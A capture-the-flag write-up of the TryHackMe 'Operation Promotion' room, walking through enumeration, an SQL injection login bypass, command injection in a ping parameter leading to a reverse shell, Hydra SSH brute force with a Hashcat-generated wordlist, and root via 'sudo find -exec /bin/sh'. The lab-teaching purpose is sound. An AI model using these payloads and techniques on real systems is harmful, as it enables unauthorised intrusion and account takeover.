# Operation Promotion

**Platform:** Tryhackme
**Category:** Boot2Root
**Difficulty:** Easy

**Challenge Description**
<img width="1381" height="542" alt="image" src="https://github.com/user-attachments/assets/f9029dd8-a28a-4356-81fe-028d13583147" />

## Overview

In this room, you'll find an admin page vulnerable to SQL injection, a classic RCE via the ping command, and privilege escalation using `sudo -l`. What makes this room special is the need to generate a custom wordlist based on the website's main page (in the format `season` + `year`) in order to read the user flag.

## Enumeration

### Port Scan with Nmap

Syntax:
```bash
nmap -p- -T4 -sV $IP
```
<br>

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### SMB enumeration

I will use `smbclient` to enumerate the shares 

Syntax:
```bash
smbclient -L //$IP/ -N
```
<br>

```text
Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        IPC$            IPC       IPC Service (RecruitCorp File Services)
```
<br>
To access this share without a username and a password, I use the following command:
<br>

```bash
smbclient //$IP/public -N
```
<br>
There is a file named README.txt which is useless for me now.
<img width="919" height="342" alt="image" src="https://github.com/user-attachments/assets/742b5756-d6d3-4ab1-9912-72b0c17c318c" />

### Web Enumeration

The main page doesn't contain anything interesting, nor does the source code.

However, the robots.txt file is present, from which I obtained a directory: `/admin/`

I will continue with `Gobuster`, which will help me discover more files and directories.

Syntax:
```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/big.txt -x .php -e
```
```text
http://10.80.161.244/.htpasswd (Status: 403) [Size: 278]
http://10.80.161.244/.htaccess (Status: 403) [Size: 278]
http://10.80.161.244/.htaccess.php (Status: 403) [Size: 278]
http://10.80.161.244/.htpasswd.php (Status: 403) [Size: 278]
http://10.80.161.244/admin (Status: 301) [Size: 314] [--> http://10.80.161.244/admin/]
http://10.80.161.244/config (Status: 403) [Size: 278]
http://10.80.161.244/index.php (Status: 200) [Size: 1620]
http://10.80.161.244/robots.txt (Status: 200) [Size: 32]
http://10.80.161.244/server-status (Status: 403) [Size: 278]
Progress: 40938 / 40938 (100.00%)
```

## Exploitation

### Login as admin

My only way in right now is the administrator login page.
<br>
<img width="429" height="368" alt="image" src="https://github.com/user-attachments/assets/2748ef75-582f-4a82-b031-9bfcc62d5acf" />
<br>
If I don't have a set of credentials, the first thing I try on a login page is to bypass it using SQL injection.

To do this, I enter the following payload into the username field: `random' OR 1=1--`
<br>
This payload will authenticate me as the first user in the database, who is the admin.

<img width="979" height="596" alt="image" src="https://github.com/user-attachments/assets/b2cff743-e61f-4515-8ff7-227d897757b4" />
<br>

### Remote Code Execution

Here I can view more information about specific users based on their user ID. I found something interesting for user ID 7.
<br>
<img width="775" height="302" alt="image" src="https://github.com/user-attachments/assets/9e785710-68ff-4cc9-9910-d8a48bb320b7" />
<br>
If I navigate to that endpoint, it tells me to provide the 'host' query parameter, followed by an IP address to ping.
<br>
Ah, the classic command injection in the ping command. If I enter `127.0.0.1;id`, the command executes.
<br>
<img width="986" height="220" alt="image" src="https://github.com/user-attachments/assets/d8dc84b8-e654-4eca-9d9c-6f483e37f1f5" />
<br>
Now I need to get reverse shell, I'll go to <a href=https://www.revshells.com/>this</a> site to generate a payload. I chose `nc mkfifo`
I need to URL-encode the payload and open a listener with the command `nc -lvnp 4444`.
<br>
<img width="654" height="155" alt="image" src="https://github.com/user-attachments/assets/7b7b37ed-621f-4620-a4fc-433827eba3ec" />

## Post Exploitation

First, shell stabilization. I find <a href=https://saeed0x1.medium.com/stabilizing-a-reverse-shell-for-interactive-access-a-step-by-step-guide-c5c32f0cb839>this</a> post very useful.

### www-data -> jford

During the web enumeration phase, I found a folder I didn't have access to: /config/

Now I can access it at /var/www/html/config, and it contains an interesting file: db.conf.
<br>

<img width="713" height="185" alt="image" src="https://github.com/user-attachments/assets/1f465eb0-dd6f-4a63-a680-36d72c191385" />

I tried cracking the hash with rockyou.txt, but it’s not working (it’s taking longer than it should for a CTF).

Then I thought about a custom wordlist, generated using CeWL or Hashcat rules.

On the website's homepage, there is a common pattern: season + year.
<br>
<img width="903" height="143" alt="image" src="https://github.com/user-attachments/assets/e12ef0f0-7c8c-4461-a5c4-ded56aa775c0" />
<br>

I will create a custom wordlist with the 'dive' rule from Hashcat:

```bash
hashcat --stdout jfordpass.txt -r /usr/share/hashcat/rules/dive.rule > finalpasslist.txt
```

This generates a payload containing approximately 100,000 passwords, which I will use with Hydra:

```bash
hydra -l jford -P finalpasslist.txt 10.80.167.167 ssh
```

<img width="1085" height="273" alt="image" src="https://github.com/user-attachments/assets/368594cb-4483-46ba-be4b-626977af3647" />
<br>
Now I can connect via SSH using `ssh jford@$IP` and retrieve the user flag.

### jford -> root

The first thing I did was try `sudo -l`, and I found that I could run the `find` command as root. <br><br>
<img width="1197" height="140" alt="image" src="https://github.com/user-attachments/assets/3ecf8af9-1924-47ed-8b8a-742257cadf35" />

So I went to <a href=https://gtfobins.org/gtfobins/find/>GTFOBins</a> and just searched for `find`.

```bash
sudo find . -exec /bin/sh \; -quit
```
<img width="537" height="134" alt="image" src="https://github.com/user-attachments/assets/d2135f97-dc0d-43bf-a463-4b57236ed04b" />

## Lesson Learned
This was an easy room, but I really liked the idea of ​​the custom wordlist.

Conclusion:
<ul>
  <li>Never give up when you see something isn't working; try harder and give everything a shot.</li>
</ul>


